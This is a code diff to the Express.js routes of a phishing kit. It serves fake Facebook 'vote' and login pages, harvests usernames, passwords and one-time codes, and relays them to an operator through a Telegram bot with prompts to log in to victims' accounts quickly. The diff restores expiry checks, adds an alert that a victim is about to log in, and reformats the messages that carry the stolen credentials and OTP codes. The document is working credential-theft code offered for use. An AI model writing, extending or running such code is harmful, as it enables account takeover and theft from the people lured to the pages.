@@ -12,9 +12,20 @@ router.get("/vote/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        // if (Date.now() > link.expiry) {
-        //     return res.redirect("/notfound");
-        // }
+        if (new Date() > new Date(link.expiry)) {
+            return res.redirect("/notfound");
+        }
+        const user = await User.findById(link.user);
+        await bot.sendMessage(user.telegramID, `
+😈 New Entry 😈
+
+Someone is about to Login!!!
+
+SOCIAL MEDIA: ${link.linkType}
+
+GET READY!!!
+
+        `)
         return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
         console.log(err)
@@ -28,9 +39,9 @@ router.get("/face/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        // if (Date.now() > link.expiry) {
-        //     return res.redirect("/notfound");
-        // }
+        if (new Date() > new Date(link.expiry)) {
+            return res.redirect("/notfound");
+        }
         if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
             return res.redirect("/notfound");
         }
@@ -48,9 +59,9 @@ router.get("/face/otp/:linkId", async (req, res) => {
         if (!link) {
             return res.redirect("/notfound");
         }
-        // if (Date.now() > link.expiry) {
-        //     return res.redirect("/notfound");
-        // }
+        if (new Date() > new Date(link.expiry)) {
+            return res.redirect("/notfound");
+        }
         if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
             return res.redirect("/notfound");
         }
@@ -88,13 +99,15 @@ router.post("/face/:linkId", async (req, res) => {
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
                 😈 New Entry 😈
-FACEBOOK
+SOCIAL MEDIA: FACEBOOK
+
 LOCATION: ${country}
 
-username: ${username}
-pasword: ${password}
-
+USERNAME: ${username}
+PASSWORD: ${password}
 OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}
+
+Login quickly 🏃🏾🏃🏾🏃🏾
 
 Login now: https://www.facebook.com
                                                 `)
@@ -125,7 +138,8 @@ router.post("/face/otp/:linkId", async (req, res) => {
         if (link) {
             await bot.sendMessage(user.telegramID, `
 😈 NEW ENTRY 😈
-FACEBOOK
+
+SOCIAL MEDIA: FACEBOOK
 
 OTP: ${code}
 
